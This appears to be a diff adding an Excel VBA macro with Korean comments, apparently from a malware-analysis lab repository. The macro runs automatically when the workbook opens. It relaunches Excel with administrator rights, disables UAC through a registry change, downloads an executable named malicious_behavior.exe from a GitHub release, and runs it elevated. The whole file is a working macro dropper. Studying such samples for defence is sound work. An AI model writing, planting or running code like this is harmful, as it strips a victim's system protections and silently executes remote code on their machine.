@@ -1,0 +1,77 @@
+Private Sub Workbook_Open()
+    If Not IsAdmin() Then
+        MsgBox "?? 관리자 권한이 필요합니다. 엑셀을 관리자 권한으로 다시 실행합니다."
+        RestartExcelAsAdmin
+    Else
+        Call DisableUAC
+        Call DownloadAndRunExe
+    End If
+End Sub
+
+' ? 관리자 권한 확인
+Function IsAdmin() As Boolean
+    On Error Resume Next
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.RegRead "HKEY_USERS\S-1-5-19\Environment\TEMP"
+    IsAdmin = (Err.Number = 0)
+End Function
+
+' ? 관리자 권한으로 엑셀 재시작
+Private Sub RestartExcelAsAdmin()
+    Dim shellApp As Object
+    Dim excelPath As String
+    Dim workbookPath As String
+
+    workbookPath = ThisWorkbook.FullName
+    excelPath = Application.Path & "\EXCEL.EXE"
+
+    Set shellApp = CreateObject("Shell.Application")
+    shellApp.ShellExecute excelPath, """" & workbookPath & """", "", "runas", 1
+
+    Application.Quit
+End Sub
+
+' ? UAC 끄기
+Sub DisableUAC()
+    On Error Resume Next
+    shell "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", vbHide
+End Sub
+
+' ? EXE 다운로드 및 관리자 권한으로 실행
+Sub DownloadAndRunExe()
+    Dim http As Object
+    Dim file As Object
+    Dim exePath As String
+    Dim downloadUrl As String
+
+    downloadUrl = "https://github.com/soomni77/MaliciousCode_analysis_and_Response/releases/download/2/malicious_behavior.exe"
+    exePath = Environ$("USERPROFILE") & "\Downloads\malicious_behavior.exe"
+
+    On Error GoTo ErrHandler
+
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", downloadUrl, False
+    http.Send
+
+    If http.Status = 200 Then
+        Set file = CreateObject("ADODB.Stream")
+        file.Type = 1
+        file.Open
+        file.Write http.ResponseBody
+        file.SaveToFile exePath, 2
+        file.Close
+
+        ' ? 관리자 권한으로 EXE 실행
+        Dim shellApp
+        Set shellApp = CreateObject("Shell.Application")
+        shellApp.ShellExecute exePath, "", "", "runas", 1
+    Else
+        MsgBox "? 다운로드 실패: " & http.Status
+    End If
+    Exit Sub
+
+ErrHandler:
+    MsgBox "?? 오류 발생: " & Err.Description
+End Sub
+
